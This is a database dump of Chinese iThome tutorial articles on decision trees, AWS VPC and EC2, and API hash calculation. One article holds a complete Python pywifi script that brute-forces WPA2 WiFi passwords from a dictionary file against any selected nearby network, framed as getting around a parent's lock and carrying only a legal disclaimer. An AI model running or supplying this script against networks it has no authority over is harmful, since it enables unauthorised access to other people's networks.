Gini。</p>\n<ul>\n<li>Information gain (資訊獲利)</li>\n<li>Gain ratio (吉尼獲利)</li>\n<li>Gini index (吉尼係數)  = Gini Impurity (吉尼不純度)</li>\n</ul>\n<h2>評估分割資訊量</h2>\n<p>Information Gain 透過從訓練資料找出規則，讓每一個決策能夠使訊息增益最大化。其算法主要是計算熵，因此經由決策樹分割後的資訊量要越小越好。而 Gini 的數值越大代表序列中的資料亂，數值皆為 0~1 之間，其中 0 代表該特徵在序列中是完美的分類。常見的資訊量評估方法有兩種：資訊獲利 (Information Gain) 以及 Gini 不純度 (Gini Impurity)。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247L4MtftpD9D.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247L4MtftpD9D.png"></p>\n<h2>熵 (Entropy)</h2>\n<p>熵 (Entropy) 是計算 Information Gain 的一種方法。在了解 Information Gain 之前要先了解熵是如何被計算出來的。其中在下圖公式中 p 代表是的機率、q 代表否的機率。我們可以從圖中範例很清楚地知道當所有的資料都被分類一致的時候 Entropy 即為 0，當資料各有一半不同時 Entropy 即為 1。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247mh1JOY7jsZ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247mh1JOY7jsZ.png"></p>\n<h2>Gini 不純度 (Gini Impurity)</h2>\n<p>Gini 不純度是另一種亂度的衡量方式，它的數字越大代表序列中的資料越混亂。公式如下所示，其中 p 代表是的機率、q 為代表的機率。我們可以從圖中範例很清楚地知道當所有的資料都被分類一致的時候混亂程度即為 0，當資料各有一半不同時混亂程度即為 0.5。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247b3lmqP6cDf.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247b3lmqP6cDf.png"></p>\n<h2>迴歸樹</h2>\n<p>決策樹迴歸方法與分類有點類似差別僅在於評估分枝好壞的方式不同，我們又可以稱作迴歸樹。當數據集的輸出爲連續性數值時，該樹算法就是一個迴歸樹。透過樹的展開，並用葉節點的均值作爲預測值。從根節點開始，對樣本的某一特徵進行測試。經過評估後，將樣本分配到其子結點。此時每一個子節點對應著該特徵的一個值。依照這樣方式進行，直至到達葉結點。此時誤差值要最小化，並且越接近零越好。</p>\n<blockquote>\n<p>迴歸樹的生長過程很推薦看<a href="https://zhuanlan.zhihu.com/p/82054400" target="_blank">這篇</a>文章</p>\n</blockquote>\n<p>以下舉一個例子假設 x 是輸入 y 是輸出，我們可以在一個平面上繪製出資料與正確答案間的分佈。假設迴歸樹的最大深度設定兩層。首先在第一層中會將所有的資料從中間切一刀此斷點為 <code>x=0.496</code> 當大於設定的值的數據點會繼續往右子樹下去延伸，反之小於 0.496 的資料點會往左子樹走。此時將會切出一個分支出來並往下擴展並形成第二層的決策分支。一直不斷持續拓展直到設定的最大深度終止，此時的節點即為葉節點也就是最終的模型輸出值。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247XfmmjbHqEJ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247XfmmjbHqEJ.png"></p>\n<h2>樹越深模型越複雜</h2>\n<p>假設我們生成一個 <code>f(x) = 3x+15 + noise</code> 的資料，其中 noise 為一個 0~1 之間的隨機數。從以下的測試可以看出隨著決策樹深度的增加，決策樹的擬合能力不斷上升。決策樹已經不僅僅擬合了我們的線性函式 <code>3x+15</code>，同時也擬合了我們添加的噪音(noise)。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247XqJrLSZUV1.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247XqJrLSZUV1.png"></p>\n<h2>迴歸樹該如何選擇切割點?</h2>\n<p>在分類模型中決策樹是以亂度作為決策樹生成時候的評估指標。但是迴歸樹透過是 <code>MSE</code> 或 <code>MAE</code> 來評估模型，並找出誤差最小的值作為樹的特徵選擇與切割點。其中前者是均方差，後者是和均值之差的絕對值之和。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247tXLxVdaCvq.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247tXLxVdaCvq.png"></p>\n<h2>CART 決策樹</h2>\n<p>在 Sklearn 套件中決策樹演算法是採用 CART&nbsp;(Classification and Regression Tree) 演算法，並且可以被拿來做分類和迴歸的預測。在決策樹的每一個節點上都是採用二分法，也就是每一個決策節點只分枝出兩個子節點。並且不斷地往下拓展，直到設定的最大深度為止，此時最大深度的節點稱為葉節點即為模型的預測輸出。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247TmVIddT24K.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247TmVIddT24K.png"></p>\n<h2>決策樹模型的優缺點</h2>\n<p>建立決策樹的過程就是不斷的尋找特徵進行決策，透過這些決策盡量的使這些資料被分為同一個類別，且試著讓混亂程度越小越好。切記樹的深度越深不一定越好，他可能會造成過度擬合的問題。訓練好的模型我們能夠視覺化決策樹的結構，相對的可解釋性就變高。此外與其它的ML模型比較起來，決策樹執行速度是它的一大優勢。因為是樹狀結構，因此在進行機器學習的時候每個決策階段都相當的明確清楚，不是 0 就是 1。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247tlG62KV2f0.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247tlG62KV2f0.png"></p>\n<h2>決策樹總結</h2>\n<p>決策樹透過所有特徵與對應的值將資料切分，來找出最適合的分枝並繼續往下拓展。若決策樹深度越深則決策的規則將越複雜，模型預測也會越接近真實答案。但若訓練集中含有過多的雜訊，太深的樹就有可能產生過擬合的情形。因此單一的決策樹肯定是不夠用的，我們可以利用集成學習中的 Boosting 架構，對迴歸樹進行改良升級。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247pgy546CqIy.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247pgy546CqIy.png"></p>\n<h2>[程式實作]</h2>\n<h2>分類決策樹</h2>\n<p>一個決策樹會根據訓練資料自動產生一棵樹。決策樹會根據資料產生很多樹狀的規則，最終訓練出來的規則會對新樣本進行預測。</p>\n<p>Parameters:</p>\n<ul>\n<li>criterion: 亂度的評估標準，gini/entropy。預設為gini。</li>\n<li>max_depth: 樹的最大深度。</li>\n<li>splitter: 特徵劃分點選擇標準，best/random。預設為best。</li>\n<li>random_state: 亂數種子，確保每次訓練結果都一樣，splitter=random 才有用。</li>\n<li>min_samples_split: 至少有多少資料才能再分</li>\n<li>min_samples_leaf: 分完至少有多少資料才能分</li>\n</ul>\n<p>Attributes:</p>\n<ul>\n<li>feature_importances_: 查詢模型特徵的重要程度。</li>\n</ul>\n<p>Methods:</p>\n<ul>\n<li>fit: 放入X、y進行模型擬合。</li>\n<li>predict: 預測並回傳預測類別。</li>\n<li>score: 預測成功的比例。</li>\n<li>predict_proba: 預測每個類別的機率值。</li>\n<li>get_depth: 取得樹的深度。</li>\n</ul>\n<pre><code class="language-py">from sklearn.tree import DecisionTreeClassifier\n\n# 建立 DecisionTreeClassifier 模型\ndecisionTreeModel = DecisionTreeClassifier(criterion = ''entropy'', max_depth=6, random_state=42)\n# 使用訓練資料訓練模型\ndecisionTreeModel.fit(train_reduced, y_train)\n# 使用訓練資料預測分類\npredicted = decisionTreeModel.predict(train_reduced)\n# 計算準確率\naccuracy = decisionTreeModel.score(train_reduced, y_train)\n</code></pre>\n<p>我們透過鳶尾花朵資料集進行 PCA 降維並訓練一個決策樹模型。透過繪製訓練決策邊界可以看到，在下圖右手邊的訓練集完整地將三個類別切割開來。而在右邊的測試集中僅有一筆紅色框起來的資料預測錯誤。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247U2KFvgMBSh.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247U2KFvgMBSh.png"></p>\n<h2>迴歸決策樹</h2>\n<p>Parameters:</p>\n<ul>\n<li>criterion: 評估切割點指標，mse/friedman_mse/mae。</li>\n<li>max_depth: 樹的最大深度。</li>\n<li>splitter: 特徵劃分點選擇標準，best/random。預設為best。</li>\n<li>random_state: 亂數種子，確保每次訓練結果都一樣，splitter=random 才有用。</li>\n<li>min_samples_split: 至少有多少資料才能再分</li>\n<li>min_samples_leaf: 分完至少有多少資料才能分</li>\n</ul>\n<p>Attributes:</p>\n<ul>\n<li>feature_importances_: 查詢模型特徵的重要程度。</li>\n</ul>\n<p>Methods:</p>\n<ul>\n<li>fit: 放入X、y進行模型擬合。</li>\n<li>predict: 預測並回傳預測類別。</li>\n<li>score: 預測成功的比例。</li>\n<li>get_depth: 取得樹的深度。</li>\n</ul>\n<pre><code class="language-py">from sklearn.tree import DecisionTreeRegressor\n\n# 建立 DecisionTreeRegressor 模型\ndecisionTreeModel = DecisionTreeRegressor(criterion = ''mse'', max_depth=4, splitter=''best'', random_state=42)\n# 使用訓練資料訓練模型\ndecisionTreeModel.fit(x, y)\n# 使用訓練資料預測\npredicted=decisionTreeModel.predict(x)\n</code></pre>\n<p>在迴歸決策樹中我們使用了簡單線性迴歸與非線性迴歸兩種資料集進行數據擬合實驗。在簡單線性迴歸中我們將數據點添加一些噪音讓資料分布在斜直線上。左圖是迴歸樹在最大深度為 4 的訓練結果，可以隱約地看到模型決策的方式呈現階梯狀態。如果我們嘗試的將數的深度增加，模型相對複雜因此可以擬合得更好。而右邊是透過隨機產生的非線性資料進行模型訓練。從訓練結果可以發現在最大深度為 4 的時候，訓練結果就還不錯了。大家可以試看看調整模型的樹最大深度以及其他的超參數對模型訓練結果的影響。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247s43yFzt5dZ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247s43yFzt5dZ.png"></p>\n<p>本系列教學內容及範例程式都可以從我的 <a href="https://github.com/andy6804tw/2021-13th-ironman" target="_blank">GitHub</a> 取得！</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'AI & Data',NULL,'2021-09-24 17:03:40');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10261703','Day 4 網路寶石：AWS VPC Region/AZ vs VPC/Subnet 關係介紹','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','4',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg"></p>\n<p>今天我們來介紹 AWS Region 與 AWS VPC 之間的關係，那我們開始吧！</p>\n<h4>AWS Region 介紹</h4>\n<p>AWS 作為雲端商，會在世界各大地區建立基礎設施，比如說東京(Tokyo)就是其中之一。而一個實體地區的概念對到 AWS 的架構中，就是 Region，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951J3RHuOCt0O.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951J3RHuOCt0O.png"></p>\n<p>而在每個 Region 內，會建立多個 Availability Zone ，簡稱 AZ。比如說，在一個 Region 上面我們可以有三個 Availability Zone，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951I3CdqKShy0.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951I3CdqKShy0.png"></p>\n<p>Availability Zone 代表著「邏輯資料中心」，因此還不是一種實體的對應，更精確來說，一個 Availability Zone 中，會有著多個「實體資料中心」，也就是實際放上主機與硬體設備等的地方。<br>\n如下圖所示，東京地區對應到一個 AWS Region 概念。每個 region 上有著多個 Availability Zone，每個 Availability Zone 裡頭又有著多個實體資料中心，藍色長方體大樓圖像即代表著，在 AZ 中的多個實體資料中心。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951AJnreDZ3TQ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951AJnreDZ3TQ.png"></p>\n<h4>AWS Region 與 VPC 關係介紹</h4>\n<p>那在我們對 Region、Availability Zone、實體資料中心有所概念之後，我們來看到 AWS VPC 這個概念。<br>\nVPC 為一種「虛擬的網路區域」，我們會將虛擬資源放入這個網路區域進行管理，比如說 EC2，他會幫我們管理其中的網路流通，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951wCzmre0qq4.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951wCzmre0qq4.png"></p>\n<p>在每個 VPC 之中，將可以涵蓋多個 Subnets，Subnet其實也就是一種「更小單位的虛擬網路區域」，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951Ri7dfwY1DQ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951Ri7dfwY1DQ.png"></p>\n<p>而 Subnet 與 AZ 的關係為何？每個 Subnet 都會對應到一個 Availability Zone，而在 AWS 建議的架構中有所謂 High Availability (HA) 的概念，換句話說，也就是要我們把程式部署到不同的 Availability Zone 中。</p>\n<p>所以當我們把程式放到 Subnets 之中，我們要確保這些 Subnets 是否對應到不同的 Availability Zone 中，如果是的話，我們就能達到 High Availability (HA)，如下圖：紅線部份代表 Subnet 與 Availability Zone 之間的對應，可以看到此處的 VPC 透過不同 Subnet 對應到多個 AZ，達到了 High Availability (HA)。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210919/20100951QVEDbU9X0H.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210919/20100951QVEDbU9X0H.jpg"></p>\n<h4>小結</h4>\n<p>本單元我們學會了 AWS 如何在世界各地設置資料中心，並瞭解其中 Region 與 Availability Zone (AZ) 的關係。從此，我們又了解了 AWS 管理網路的服務 VPC，以及其與 Subnet 之間的階層關係，兩者皆用來管理與網路相關的資源與設定。</p>\n<h4>What''s Next?</h4>\n<p>明天，我們將接著介紹「VPC架構 Routes &amp; Security」！</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-09 03:45:07');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10262399','Day 6 網路寶石：AWS VPC 架構 Routes & Security (下)','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','6',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg"></p>\n<h4>NACL vs SG 的安全設定介紹</h4>\n<p>當請求想進出在 Private Subnet 內的 EC2 時，會遇到 Subnet 階層的保護工具 NACL（Network Access Control List），它用於規範何種請求可以進出此Subnet，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951BdLQ8TyhpN.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951BdLQ8TyhpN.png"></p>\n<p>當成功通過 NACL 的規範之後，請求可以繼續往裡面走，但在碰到EC2前，還會遇到 EC2 Instance 階層的保護 SG（Security Group），是一類似防火牆規範的工具，請求必須通過此規範，才能進到EC2。而當請求要離開 EC2 時，會再次受到 SG 的驗證，再原路返回送出此請求的來源。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951YuA3ojcKFU.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951YuA3ojcKFU.png"></p>\n<p>然而實際上，請求離開 SG 時不需再驗證一次。因為 SG 是一個 stateful 的工具，所以它記得該請求從哪來且自己允許過該請求進來，離開時便不會再驗證一次，是一個重要的特性，須謹記。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951BaYSV022gl.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951BaYSV022gl.png"></p>\n<p>相反地，若從「EC2 發出請求」的角度來看，當網路請求要從EC2出去時，第一層會遇到 SG，只有獲得 SG 允許，請求才能順利通過，再來第二層會遇到 NACL，一樣必須獲得 NACL 允許，才能真的出去，最後到達目的地 IP（如下圖橘色實線所示）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951STPgUt3Paf.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951STPgUt3Paf.png"></p>\n<p>之後原路返回時， 先遇到 NACL，還是需要通過驗證才能進入，但當再碰到 SG，就不必再進行驗證（如下圖橘色虛線所示）。因為 SG 為 stateful，記得此請求曾經在自己允許下出去過，回來時就可以直接進到 EC2。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951NeDufr5Ypy.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951NeDufr5Ypy.png"></p>\n<h4>小結</h4>\n<p>那這次，我們了解了 AWS VPC 的網路流通方式，透過 Route Table 的設定並搭配 NAT 與 IGW 來連通內外網。此外，我們也學會了其安全設定的各種階層，含有 NACL 以及 Security Group，讓我們能有效的管理網路安全。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009513uqsD9EwWC.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009513uqsD9EwWC.png"></p>\n<h4>What''s Next?</h4>\n<p>明天，我們將接著介紹「【Lab】VPC外網 Public Subnet to the Internet (IGW)」！</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-11 10:59:08');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10262805','[Day14] 家裡WiFi被媽媽鎖了怎麼辦? 教你用Python破解WiFi密碼 !','奇怪的知識增加了!原來程式還可以這樣用?!','14',replace('\n                        <div class="markdown__style">\n                                                            <blockquote>\n<p>《刑法》第358條：「無故輸入他人帳號密碼、破解使用電腦之保護措施或利用電腦系統之漏洞，而入侵他人之電腦或其相關設備者，處三年以下有期徒刑、拘役或科或併科三十萬元以下罰金。」</p>\n</blockquote>\n<p>破解人家WiFi密碼是犯法的喔!然後未經同意使用別人的WiFi會再犯一個法，<br>\n我們只能破解自己家的密碼，不要去破解鄰居家的WiFi喔!</p>\n<p>免責聲明: 若讀者因私德問題侵犯他人權益，本人不負任何責任</p>\n<hr>\n<p>遙想當年考試前媽媽都會把家裡的WiFi鎖起來，沒WiFi真的有夠痛苦...<br>\n這個程式獻給家管嚴又想上網增長知識的朋友們~</p>\n<p><strong>使用環境</strong></p>\n<ul>\n<li>\n<a href="https://www.python.org/downloads/" target="_blank">Python 3</a>\n</li>\n<li>\n<a href="https://notepad-plus-plus.org/downloads/" target="_blank">notepad++</a>\n</li>\n<li>\n<a href="https://pypi.org/project/pywifi/" target="_blank">pywifi</a>\n</li>\n<li>\n<a href="https://pythonhosted.org/comtypes/" target="_blank">comtypes</a>\n</li>\n<li>\n<a href="https://python-inquirer.readthedocs.io/en/latest/" target="_blank">inquirer</a>(選單功能)</li>\n<li>密碼字典 (可以自己做也可以上網下載別人做好的)</li>\n</ul>\n<p><strong>程式碼</strong></p>\n<pre><code>import pywifi\nfrom pywifi import const\nimport time\nimport inquirer\n\ndef connect(name,password):\n    interface = pywifi.PyWiFi().interfaces()[0]\n    interface.disconnect() # 中斷目前wifi連線\n    time.sleep(1)\n    if interface.status() == const.IFACE_DISCONNECTED:\n        prof = pywifi.Profile()\n        prof.ssid = name # wifi的ssid(wifi名稱)\n        prof.key = password # wifi的密碼\n        prof.akm.append(const.AKM_TYPE_WPA2PSK) # wifi加密算法\n        prof.auth = const.AUTH_ALG_OPEN # 網卡的開放\n        prof.cipher = const.CIPHER_TYPE_CCMP # 加密單元\n        interface.remove_all_network_profiles() # 刪除所有的wifi文件\n        tep_prof = interface.add_network_profile(prof)\n        interface.connect(tep_prof) # 自動連上破解的wifi\n        time.sleep(1)\n        if interface.status() == const.IFACE_CONNECTED:\n            return True\n        else:\n            return False\ndef main():\n    file = open("D:/password.txt",''r'') # 打開下載的密碼字典\n    wifis = []\n    iface = pywifi.PyWiFi().interfaces()[0] # 掃描現有的wifi\n    res = iface.scan_results()\n    for i, prof in enumerate(res):\n        wifis.append(prof.ssid)\n    questions = [ # wifi選單\n        inquirer.List(''wifi'', message = "你要破解哪個wifi?", choices = wifis),\n    ]\n    answers = inquirer.prompt(questions)\n    curr_name = answers[''wifi'']\n        \n    while 1:\n        curr_pwd = file.readline()\n        try:\n            status = connect(curr_name,curr_pwd)\n            if status:\n                print("密碼是:"+curr_pwd)\n                break\n            else:\n               print("錯誤的密碼:%s"%curr_pwd)\n        except:\n            continue\n    file.close()\nif __name__==''__main__'':\n	main()\n</code></pre>\n<p><strong>成果發表會</strong><br>\n<img src="https://ppt.cc/fopJ3x@.gif" alt=""><br>\n注意看右下角的WiFi狀態! 取得WiFi正確密碼就會自己連上囉~<br>\n因為時間有限，就只拿幾個密碼當範例</p>\n<p><strong>溫馨小提醒</strong></p>\n<p>pywifi破解密碼的速度很慢，所以實際效用不大，<br>\n而且密碼本也不一定能100%破解，但是有試有機會啦&gt;&lt;</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Software Development',NULL,'2021-09-14 12:19:00');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10263305','Day 9 運算寶石：EC2 重點架構','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','9',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210914/20100951aqaopPkpM7.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210914/20100951aqaopPkpM7.jpg"></p>\n<p>今天我們要來介紹 EC2 的基本架構，那我們開始吧!<br>\nEC2 Instance由許多重要元件組成，我們將會分成三大部分介紹。</p>\n<h4>AMI</h4>\n<p>在一個 EC2 Instance 裡面有一個重要元件叫做 AMI (Amazon Machine Image) 如下圖。AMI 最主要的功用就是決定我們的作業系統 Operating System (OS)。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951neAMUXx0SH.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951neAMUXx0SH.png"></p>\n<p>AMI 就如同一個模板，當我們每次在建立 EC2 Instance 時就要選擇使用何種 AMI。<br>\nAMI 還包含許多細部設定，我們將在未來再來細看，這邊先用 TBD (To Be Defined) 標記起來。</p>\n<h4>Instance Metadata</h4>\n<p>當我們啟動一台 Instance 時，會有一些 Instance 層面的資料，裡面包含 Instance ID、Hostname 等，如下圖。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951nLUsvHWsSD.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951nLUsvHWsSD.png"></p>\n<h4>Instance Type</h4>\n<p>在 Instance Type 中，我們會去決定 Instance 本身要使用多少資源，包含我們要使用 vCPU、記憶題、儲存空間的多寡。</p>\n<p>這邊要注意到如下圖例中的 Instance Storage 是一個本地的儲存空間，會隨著 EC2 Instance 的更動而改變，換句話說，若 EC2 Instance 消失，Instance Storage 就會不見，因此也就不適合放置永久資訊。不過好處則是，由於它就在 EC2 Instance 上面，所以它能讓我們進行非常高效率的 I/O 工作。</p>\n<p>再來，可以決定 Network speed，Network speed 則是決定 EC2 Instance 能負荷多少網路流量。而最後 EC2 中還有許多細部設定，會留在未來做細部探討(TBD)。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951ijMsVfDa7G.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951ijMsVfDa7G.png"></p>\n<h4>EC2 連接的子服務</h4>\n<p>當我們在 AWS Console 建立一台 EC2 時，我們會連接許多子服務。</p>\n<h4>Network 網路</h4>\n<p>我們會配給 EC2 一個或多個虛擬網卡 (ENI)，而 EC2 Instance 在 AWS 網路架構中的角色就是由 ENI 來決定，因此如下圖，我們必須看 ENI 在哪一個 Security Group 以及哪一個 Subnet，以及被哪一個 NACL 所管控。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951EGM5sIxels.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951EGM5sIxels.png"></p>\n<h4>Permission 權限</h4>\n<p>在 AWS 之中，管理權限有個重要元件叫 IAM Role，然而 IAM Role 並不能直接被 EC2 Instance 給使用，因此需要一個銜接角色來把它們串起，而這個角色就叫做 Instance Profile，如下圖。</p>\n<p>Instance Profile 會將 IAM Role 轉換為 EC2 Instance 可以使用的形式，來管控 EC2 Instance 可以使用哪種權限以及 AWS 服務。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951OnsMQhaPNY.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951OnsMQhaPNY.png"></p>\n<h4>External Storage</h4>\n<p>External Storage 顧名思義是一個外接的儲存空間，服務名稱叫做EBS Volume (Elastic Block Storage Volume)，如下圖。</p>\n<p>有別於 Instance Storage，EBS Volume 並不會隨著 EC2 Instance 的消失而不見，因此適合放置永久資料。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951ZMFjHZY0Kr.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951ZMFjHZY0Kr.png"></p>\n<p>以上提到的三種服務都有各自的架構及運作邏輯，後面幾天將細部說明。</p>\n<h4>小結</h4>\n<p>EC2 主體實際上只有如下圖圈起方框部分，而右側都是可以連結的子系統們，EC2 必須透過與這些服務的連結，才能建出一個完整的虛擬機功能。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951CsFIDlzh5o.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951CsFIDlzh5o.png"></p>\n<h4>What''s Next?</h4>\n<p>明天我們將接著介紹「EC2儲存資源 Instance Store vs Elastic Block Storage (EBS)」。</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-14 06:13:27');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10259617','計算API所需要的參數: Hash ID','串接生活與金融 API','2',replace('\n                        <div class="markdown__style">\n                                                            <p>看著規格書，所需要的參數還蠻多的</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20130033upiQzTW6OZ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20130033upiQzTW6OZ.png"></p>\n<p>今天就先用 Python 來求算 Hash ID!</p>\n<p>依據官方的說明文件:</p>\n<p>Hash ID是透過位元運算(XOR)將四組Hash計算產出的，將A1/A2以XOR運算所得的字串，再與B1/B2以XOR運算出來的字串，二個相加後將英文轉換為大寫，為長度為32的字串(例: 17D8E6558DC60E702A6B57E1B9B7060D)。</p>\n<p>在 Python 中實作起來如下：</p>\n<pre><code>\ndef strToHexByte(s):\n    return int(s,base=16)\n\nA1 = "4D9709D699CA40EE"\nA2 = "5A4FEF83140C4E9E"\nB1 = "BC74301945134CB4"\nB2 = "961F67F8FCA44AB9"\n\n# 透過 ^ 進行 XOR 計算\nXOR1 = strToHexByte(A1) ^ strToHexByte(A2)\nXOR2 = strToHexByte(B1) ^ strToHexByte(B2)\n\n# 將 XOR 的結果(數字) 轉成 hex\nhex_XOR1 = hex(XOR1)\nhex_XOR2 = hex(XOR2)\n\n# 將字串合併後，再大寫\nhash_id = ( hex_XOR1 + hex_XOR2 ).upper()\n</code></pre>\n<p>結果是:<br>\n"0X17D8E6558DC60E700X2A6B57E1B9B7060D"<br>\n而官方示例中:<br>\n"17D8E6558DC60E702A6B57E1B9B7060D"</p>\n<p>可以發現多出了"0X"的前置字元，上網查了一下，這是 python 的特性；<br>\n官方的 PHP 示例中是不會有這個狀況發生。<br>\n所以此處要將上方的程式碼最後一段調整為</p>\n<pre><code># 透過 Python 的  字串[開始位置:結束位置]，\n# 因為我們不要前面2個符號，所以用 [2:]的方式來截斷文字\n\nhash_id = ( hex_XOR1[2:] + hex_XOR2[2:] ).upper()\n\n</code></pre>\n<p>這樣得到的結果就會與官方示範完全相同。</p>\n<p>天啊! 第2天而已，還有一些參數需要進行類似的計算…<br>\n希望能快點進入實戰!</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'永豐金融APIs',NULL,'2021-09-02 21:49:00');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10262727','Day 7 網路寶石：【Lab】VPC外網 Public Subnet to the Internet (IGW) (上)','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','7',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg"></p>\n<p>今天我們要示範如何讓一個在 Public Subnet 裡面的 EC2 instance 可以與 Internet 溝通（如下圖橘線所示），這次屬於實作 Lab 練習，有興趣的人可以跟著一起做，那我們現在開始吧。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951XqTSkQxYbv.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951XqTSkQxYbv.png"></p>\n<h4>建立VPC</h4>\n<p>到AWS Management Console介面，在Find Services搜尋VPC並點擊。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951etc5JZbBbv.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951etc5JZbBbv.png"></p>\n<p>點選左側 Your VPCs tag，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009515gZNE8vV5o.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009515gZNE8vV5o.png"></p>\n<p>點擊 Create VPC，如下圖。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951V8iDrDZJIg.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951V8iDrDZJIg.png"></p>\n<p>創造一個VPC步驟如下：</p>\n<p>(1)給VPC一個名稱 